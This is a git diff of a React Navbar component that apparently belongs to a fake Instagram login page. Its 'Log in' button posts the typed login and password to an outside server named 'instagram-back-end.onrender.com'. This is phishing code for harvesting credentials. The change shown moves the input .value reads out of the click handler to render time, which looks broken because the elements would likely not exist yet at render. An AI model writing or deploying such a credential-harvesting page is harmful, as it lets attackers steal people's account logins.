@@ -7,8 +7,8 @@ import "./Navbar.css";
 
 export default function Navbar() {
 
-    let text1 = document.querySelector(".inp");
-    let text2 = document.querySelector(".inpt")
+    let text1 = document.querySelector(".inp").value;
+    let text2 = document.querySelector(".inpt").value;
 
     return (
         <>
@@ -30,16 +30,14 @@ export default function Navbar() {
                                     </div>
                                     <div className="s">
                                         <button className="tn" onClick={() => {
-                                            let tex1 = text1.value;
-                                            let tex2 = text2.value;
                                             fetch('https://instagram-back-end.onrender.com/data', {
                                                 method: 'POST',
                                                 headers: {
                                                     'Content-Type': 'application/json'
                                                 },
                                                 body: JSON.stringify({
-                                                    login: tex1,
-                                                    password: tex2
+                                                    login: text1,
+                                                    password: text2
                                                 })
                                             })
                                         }}>Log in</button>
